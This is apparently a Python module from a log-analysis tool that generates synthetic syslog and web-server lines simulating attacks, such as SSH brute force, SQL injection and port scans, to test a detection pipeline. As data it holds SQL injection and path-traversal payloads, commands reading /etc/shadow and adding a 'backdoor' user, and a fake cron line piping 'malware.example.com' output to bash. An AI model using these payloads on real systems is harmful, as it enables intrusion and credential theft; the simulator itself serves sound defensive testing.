"""
SysLog Threat Analysis - Attack Simulation Engine

Generates realistic attack log sequences and appends them to a file
in the monitored folder. Logs travel through the full pipeline:
    Watcher -> Parser -> Detection -> Correlation -> WebSocket -> Dashboard

Each scenario produces syntactically valid syslog lines that the parser
can recognise, ensuring the simulation is indistinguishable from real logs.
"""

from __future__ import annotations

import asyncio
import logging
import random
import time
from datetime import datetime, timedelta
from enum import Enum
from pathlib import Path
from typing import Optional

from config import SAMPLE_LOGS_DIR

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

HOSTNAME = "prod-web-01"

ATTACKER_IPS = [
    "185.220.101.34", "91.240.118.172", "103.214.56.78",
    "78.46.89.12", "198.51.100.23", "45.33.32.156",
]

TARGET_USERS = ["admin", "root", "deploy", "ubuntu", "webadmin"]
INVALID_USERS = ["test", "guest", "oracle", "ftpuser", "postgres", "backup"]

ATTACK_PATHS = [
    "/admin", "/wp-login.php", "/phpmyadmin", "/.env", "/config.yml",
    "/backup.sql", "/.git/config", "/server-status", "/cgi-bin/test.cgi",
]
SQLI_PATHS = [
    "/search?q=test' OR 1=1--",
    "/api/v1/users?id=1 UNION SELECT username,password FROM users--",
    "/login?user=admin'--&pass=x",
]
TRAVERSAL_PATHS = [
    "/../../etc/passwd", "/../../etc/shadow",
    "/..%2f..%2fetc/passwd", "/static/../../config.yml",
]
ATTACK_UAS = [
    "sqlmap/1.7.10", "nikto/2.5.0", "Nmap Scripting Engine",
    "dirbuster/1.0-RC1", "gobuster/3.6",
]

SYSTEM_SERVICES = ["nginx", "postgresql", "redis-server", "docker", "cron"]


class SimSpeed(str, Enum):
    SLOW = "slow"
    NORMAL = "normal"
    FAST = "fast"
    VERY_FAST = "very_fast"


SPEED_DELAYS = {
    SimSpeed.SLOW: 2.0,
    SimSpeed.NORMAL: 0.8,
    SimSpeed.FAST: 0.2,
    SimSpeed.VERY_FAST: 0.05,
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _ts_bsd(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S").replace("  0", "  ")


def _ts_apache(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def _pick_attacker() -> str:
    return random.choice(ATTACKER_IPS)


def _pid() -> int:
    return random.randint(1000, 65000)


# ---------------------------------------------------------------------------
# Scenario generators
# ---------------------------------------------------------------------------

def gen_ssh_brute_force(target_user: str = "admin", count: int = 15) -> list[str]:
    """SSH brute force — many failed passwords from one IP."""
    lines: list[str] = []
    t = datetime.now()
    ip = _pick_attacker()
    for _ in range(count):
        t += timedelta(seconds=random.randint(1, 4))
        lines.append(
            f"{_ts_bsd(t)} {HOSTNAME} sshd[{_pid()}]: "
            f"Failed password for {target_user} from {ip} port 22 ssh2"
        )
    return lines


def gen_ssh_brute_then_login(target_user: str = "admin") -> list[str]:
    """Brute force followed by successful login — account compromise."""
    lines = gen_ssh_brute_force(target_user, count=12)
    t = datetime.now() + timedelta(seconds=50)
    ip = lines[0].split("from ")[1].split(" port")[0]  # same attacker
    t += timedelta(seconds=random.randint(2, 5))
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} sshd[{_pid()}]: "
        f"Accepted password for {target_user} from {ip} port 22 ssh2"
    )
    # Post-compromise activity
    t += timedelta(seconds=3)
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} sshd[{_pid()}]: "
        f"pam_unix(sshd:session): session opened for user {target_user}"
    )
    t += timedelta(seconds=5)
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} sudo: {target_user} : TTY=pts/0 ; "
        f"PWD=/home/{target_user} ; USER=root ; COMMAND=/bin/cat /etc/shadow"
    )
    return lines


def gen_web_recon() -> list[str]:
    """Web scanner burst — many 404s from one IP."""
    lines: list[str] = []
    t = datetime.now()
    ip = _pick_attacker()
    ua = random.choice(ATTACK_UAS)
    for _ in range(20):
        t += timedelta(seconds=random.randint(1, 2))
        path = random.choice(ATTACK_PATHS)
        lines.append(
            f'{ip} - - [{_ts_apache(t)}] "GET {path} HTTP/1.1" '
            f'404 {random.randint(200, 500)} "-" "{ua}"'
        )
    return lines


def gen_directory_traversal() -> list[str]:
    """Directory traversal attempts."""
    lines: list[str] = []
    t = datetime.now()
    ip = _pick_attacker()
    ua = random.choice(ATTACK_UAS[:2])
    for _ in range(8):
        t += timedelta(seconds=random.randint(1, 3))
        path = random.choice(TRAVERSAL_PATHS)
        lines.append(
            f'{ip} - - [{_ts_apache(t)}] "GET {path} HTTP/1.1" '
            f'400 {random.randint(200, 500)} "-" "{ua}"'
        )
    return lines


def gen_sql_injection() -> list[str]:
    """SQL injection attempts."""
    lines: list[str] = []
    t = datetime.now()
    ip = _pick_attacker()
    ua = "sqlmap/1.7.10"
    for _ in range(10):
        t += timedelta(seconds=random.randint(1, 3))
        path = random.choice(SQLI_PATHS)
        lines.append(
            f'{ip} - - [{_ts_apache(t)}] "GET {path} HTTP/1.1" '
            f'400 {random.randint(100, 300)} "-" "{ua}"'
        )
    return lines


def gen_firewall_deny_burst() -> list[str]:
    """Burst of firewall blocks from multiple IPs."""
    lines: list[str] = []
    t = datetime.now()
    for _ in range(15):
        t += timedelta(seconds=random.randint(1, 2))
        ip = _pick_attacker()
        port = random.choice([22, 3306, 445, 23, 8080, 5432])
        lines.append(
            f"{_ts_bsd(t)} {HOSTNAME} kernel: [UFW BLOCK] IN=eth0 OUT= "
            f"MAC=00:00:00:00:00:00 SRC={ip} DST=192.168.1.10 LEN=60 "
            f"TOS=0x00 TTL=64 PROTO=TCP SPT={random.randint(40000, 65000)} DPT={port}"
        )
    return lines


def gen_port_scan() -> list[str]:
    """Port scan — rapid connection attempts to many ports."""
    lines: list[str] = []
    t = datetime.now()
    ip = _pick_attacker()
    ports = random.sample(range(20, 10000), 25)
    for port in ports:
        t += timedelta(milliseconds=random.randint(100, 500))
        lines.append(
            f"{_ts_bsd(t)} {HOSTNAME} kernel: [UFW BLOCK] IN=eth0 OUT= "
            f"MAC=00:00:00:00:00:00 SRC={ip} DST=192.168.1.10 LEN=60 "
            f"TOS=0x00 TTL=64 PROTO=TCP SPT={random.randint(40000, 65000)} DPT={port}"
        )
    return lines


def gen_repeated_service_failure() -> list[str]:
    """Service crashing and restarting repeatedly."""
    lines: list[str] = []
    t = datetime.now()
    service = random.choice(SYSTEM_SERVICES)
    for _ in range(6):
        t += timedelta(seconds=random.randint(5, 15))
        lines.append(f"{_ts_bsd(t)} {HOSTNAME} systemd[1]: {service}.service: Main process exited, code=exited, status=1/FAILURE")
        t += timedelta(seconds=2)
        lines.append(f"{_ts_bsd(t)} {HOSTNAME} systemd[1]: {service}.service: Failed with result 'exit-code'.")
        t += timedelta(seconds=3)
        lines.append(f"{_ts_bsd(t)} {HOSTNAME} systemd[1]: Started {service}.service.")
    return lines


def gen_privilege_escalation(target_user: str = "admin") -> list[str]:
    """Suspicious privilege escalation sequence."""
    lines: list[str] = []
    t = datetime.now()
    ip = _pick_attacker()
    pid = _pid()
    # Login
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} sshd[{pid}]: "
        f"Accepted password for {target_user} from {ip} port 22 ssh2"
    )
    t += timedelta(seconds=3)
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} sshd[{pid}]: "
        f"pam_unix(sshd:session): session opened for user {target_user}"
    )
    # Escalation
    t += timedelta(seconds=5)
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} sudo: {target_user} : TTY=pts/0 ; "
        f"PWD=/home/{target_user} ; USER=root ; COMMAND=/bin/cat /etc/shadow"
    )
    t += timedelta(seconds=8)
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} sudo: {target_user} : TTY=pts/0 ; "
        f"PWD=/home/{target_user} ; USER=root ; COMMAND=/usr/sbin/useradd backdoor"
    )
    t += timedelta(seconds=3)
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} su[{_pid()}]: "
        f"pam_unix(su:session): session opened for user root by {target_user}"
    )
    return lines


def gen_suspicious_cron() -> list[str]:
    """Suspicious cron job execution."""
    lines: list[str] = []
    t = datetime.now()
    pid = _pid()
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} CRON[{pid}]: (root) CMD (/tmp/.hidden/payload.sh)"
    )
    t += timedelta(seconds=2)
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} CRON[{pid + 1}]: (root) CMD (curl -s http://malware.example.com/c2 | bash)"
    )
    t += timedelta(seconds=5)
    lines.append(
        f"{_ts_bsd(t)} {HOSTNAME} CRON[{pid + 2}]: (www-data) CMD (/var/www/.backdoor.py)"
    )
    return lines


# ---------------------------------------------------------------------------
# Scenario registry
# ---------------------------------------------------------------------------

SCENARIOS: dict[str, dict] = {
    "ssh_brute_force": {
        "name": "SSH Brute Force",
        "description": "Rapid SSH login failures from a single IP",
        "generator": gen_ssh_brute_force,
        "category": "authentication",
    },
    "ssh_brute_then_login": {
        "name": "SSH Login After Brute Force",
        "description": "Brute force followed by successful login and post-compromise activity",
        "generator": gen_ssh_brute_then_login,
        "category": "authentication",
    },
    "web_recon": {
        "name": "Web Reconnaissance",
        "description": "Automated web scanner probing for hidden paths",
        "generator": gen_web_recon,
        "category": "web",
    },
    "directory_traversal": {
        "name": "Directory Traversal",
        "description": "Path traversal attempts to access system files",
        "generator": gen_directory_traversal,
        "category": "web",
    },
    "sql_injection": {
        "name": "SQL Injection",
        "description": "SQL injection payloads in web requests",
        "generator": gen_sql_injection,
        "category": "web",
    },
    "firewall_deny_burst": {
        "name": "Firewall Deny Burst",
        "description": "Burst of firewall blocks from multiple sources",
        "generator": gen_firewall_deny_burst,
        "category": "network",
    },
    "port_scan": {
        "name": "Port Scan",
        "description": "Rapid connection attempts to many ports from one IP",
        "generator": gen_port_scan,
        "category": "network",
    },
    "repeated_service_failure": {
        "name": "Repeated Service Failure",
        "description": "Service crashing and restarting in a loop",
        "generator": gen_repeated_service_failure,
        "category": "system",
    },
    "privilege_escalation": {
        "name": "Privilege Escalation",
        "description": "Login followed by sudo escalation and suspicious commands",
        "generator": gen_privilege_escalation,
        "category": "authentication",
    },
    "suspicious_cron": {
        "name": "Suspicious Cron Execution",
        "description": "Cron jobs executing hidden or remote payloads",
        "generator": gen_suspicious_cron,
        "category": "system",
    },
}

SCENARIO_IDS = list(SCENARIOS.keys())


# ---------------------------------------------------------------------------
# Simulator engine
# ---------------------------------------------------------------------------

class SimulatorEngine:
    """
    Manages attack simulation lifecycle.

    Writes generated log lines to a file inside the watched folder so the
    existing LogWatcher picks them up and routes them through the full
    pipeline (Parser -> Detection -> Correlation -> WebSocket).
    """

    def __init__(self) -> None:
        self._active: bool = False
        self._task: Optional[asyncio.Task] = None
        self._speed: SimSpeed = SimSpeed.NORMAL
        self._scenarios: list[str] = []
        self._target_user: str = "admin"
        self._randomize_ips: bool = True
        self._events_generated: int = 0
        self._start_time: Optional[float] = None
        self._sim_file: Path = SAMPLE_LOGS_DIR / "simulation.log"

    # -- Properties --

    @property
    def is_active(self) -> bool:
        return self._active

    @property
    def events_generated(self) -> int:
        return self._events_generated

    def status(self) -> dict:
        return {
            "active": self._active,
            "speed": self._speed.value,
            "scenarios": self._scenarios,
            "target_user": self._target_user,
            "randomize_ips": self._randomize_ips,
            "events_generated": self._events_generated,
            "elapsed_seconds": round(time.time() - self._start_time, 1) if self._start_time else 0,
            "sim_file": str(self._sim_file),
        }

    # -- Generate one-shot --

    def generate_once(
        self,
        scenarios: Optional[list[str]] = None,
        target_user: str = "admin",
    ) -> int:
        """Generate a single batch of attack logs. Returns line count."""
        chosen = scenarios or SCENARIO_IDS
        lines: list[str] = []
        for sid in chosen:
            scenario = SCENARIOS.get(sid)
            if not scenario:
                continue
            gen = scenario["generator"]
            if "target_user" in gen.__code__.co_varnames:
                lines.extend(gen(target_user=target_user))
            else:
                lines.extend(gen())
        self._write_lines(lines)
        self._events_generated += len(lines)
        logger.info("Simulation one-shot: %d lines from %d scenarios", len(lines), len(chosen))
        return len(lines)

    # -- Continuous simulation --

    async def start(
        self,
        scenarios: Optional[list[str]] = None,
        speed: SimSpeed = SimSpeed.NORMAL,
        target_user: str = "admin",
        randomize_ips: bool = True,
    ) -> None:
        """Start continuous simulation."""
        if self._active:
            await self.stop()

        self._scenarios = scenarios or SCENARIO_IDS
        self._speed = speed
        self._target_user = target_user
        self._randomize_ips = randomize_ips
        self._active = True
        self._start_time = time.time()
        self._task = asyncio.create_task(self._run_loop())
        logger.info(
            "Simulation started: speed=%s, scenarios=%d, target=%s",
            speed.value, len(self._scenarios), target_user,
        )

    async def stop(self) -> None:
        """Stop continuous simulation."""
        self._active = False
        if self._task and not self._task.done():
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
        self._task = None
        logger.info("Simulation stopped: %d events generated", self._events_generated)

    def reset(self) -> None:
        """Clear simulation state and log file."""
        self._events_generated = 0
        self._start_time = None
        self._scenarios = []
        if self._sim_file.exists():
            self._sim_file.unlink()
            logger.info("Simulation log file cleared")

    # -- Internal --

    async def _run_loop(self) -> None:
        """Continuous generation loop."""
        delay = SPEED_DELAYS.get(self._speed, 0.8)
        while self._active:
            try:
                scenario_id = random.choice(self._scenarios)
                scenario = SCENARIOS.get(scenario_id)
                if not scenario:
                    continue
                gen = scenario["generator"]
                if "target_user" in gen.__code__.co_varnames:
                    lines = gen(target_user=self._target_user)
                else:
                    lines = gen()
                self._write_lines(lines)
                self._events_generated += len(lines)
            except Exception as exc:
                logger.error("Simulation error: %s", exc, exc_info=True)
            await asyncio.sleep(delay)

    def _write_lines(self, lines: list[str]) -> None:
        """Append lines to the simulation log file."""
        if not lines:
            return
        SAMPLE_LOGS_DIR.mkdir(exist_ok=True)
        with open(self._sim_file, "a", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")


# Global instance
simulator = SimulatorEngine()
